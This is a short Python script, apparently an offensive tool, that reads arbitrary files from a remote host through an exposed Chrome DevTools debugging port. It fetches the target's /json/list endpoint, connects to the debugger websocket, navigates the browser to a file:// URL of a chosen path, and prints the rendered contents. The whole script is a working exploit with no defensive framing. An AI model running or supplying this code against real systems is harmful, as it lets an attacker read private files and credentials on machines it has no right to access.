#!/usr/bin/env python3

from websockets.sync.client import connect
from bs4 import BeautifulSoup
from random import randint
import requests
import json
import sys

if len(sys.argv)-1 != 2:
    print(f'Usage: {sys.argv[0]} target file')
    sys.exit()

target = sys.argv[1]
file_read = sys.argv[2]
r = randint(1, 1024)

#http request
http_url = 'http://' + target + '/json/list'
http_get = requests.get(http_url)
http_resp = json.loads(http_get.text)

#websocket variable
ws_url = http_resp[0]['webSocketDebuggerUrl']
ws_readFile = '{"id": %d, "method":"Page.navigate", "params":{"url":"file://%s"} }' %(r, file_read)
ws_render = '{"id": %d, "method":"Runtime.evaluate", "params":{"expression":"document.documentElement.outerHTML"} }' %r

#websocket connection
with connect(ws_url) as websocket:
        websocket.send(ws_readFile)
        websocket.send(ws_render)
        message = websocket.recv()
        raw = json.loads(message)['result']['result']['value']
        clean = BeautifulSoup(raw, "lxml").text
        print(clean)
        websocket.close()
sys.exit()
